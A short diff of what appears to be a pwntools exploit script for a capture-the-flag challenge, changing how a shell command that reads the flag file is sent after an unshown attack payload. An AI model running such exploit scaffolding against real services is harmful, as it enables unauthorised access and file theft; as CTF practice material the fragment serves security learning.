@@ -14,6 +14,6 @@ log.success('Attack payload -> {}'.format(p))
 
 y.send(p)
 
-y.send('cat /home/`whoami`/flag\n')
+y.sendline('cat /home/`whoami`/flag')
 
 y.interactive()
